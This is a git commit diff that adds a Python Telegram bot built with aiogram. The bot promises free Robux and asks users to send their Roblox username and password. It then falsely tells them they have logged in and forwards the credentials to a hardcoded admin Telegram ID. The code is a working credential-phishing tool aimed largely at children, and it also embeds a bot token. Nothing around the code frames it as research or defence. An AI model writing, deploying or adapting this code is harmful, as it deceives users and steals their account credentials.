202576f610d9cc9d1cfae0502600d78c36feb4ea
Your Name <you@example.com>
2024-12-29 13:14:56 +0300

    Added requirements, bash script

---
+++ main.py
@@ -0,0 +1,42 @@
+from aiogram.types import Message
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import CommandStart, Command
+import asyncio
+import requests
+
+Token = '5832518494:AAG2TZ9XiHw_HlfFAiJq8gzFes8JT-TjzAk'
+
+bot = Bot(token=Token)
+dp = Dispatcher()
+
+@dp.message(CommandStart())
+async def start(message: Message):
+    await message.answer('Hello! I am bot for give you free robux! To recieve robux type /robux <amount>')
+
+@dp.message(Command('robux'))
+async def robux(message: Message):
+    args = message.text.split()
+    if len(args) > 1:
+        amount = args[1]
+        await message.answer(f'You will receive {amount} robux, but you need to log in to your roblox account. Please enter your username and password in the following format: /login username password')
+    else:
+        await message.answer('Please specify the amount of robux you would like to receive.')
+    
+@dp.message(Command('login'))
+async def login(message: Message):
+    args = message.text.split()
+    if len(args) >= 2:
+        username = args[1]
+        password = args[2]
+        await message.answer(f'You have successfully logged in. You will receive robux soon.')
+        admin_id = '1621436440'
+        await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
+    else:
+        await message.answer('Please enter your username and password in the following format: /login username password')
+        
+
+async def main() -> None:
+    await dp.start_polling(bot)
+
+if __name__ == '__main__':
+    asyncio.run(main())
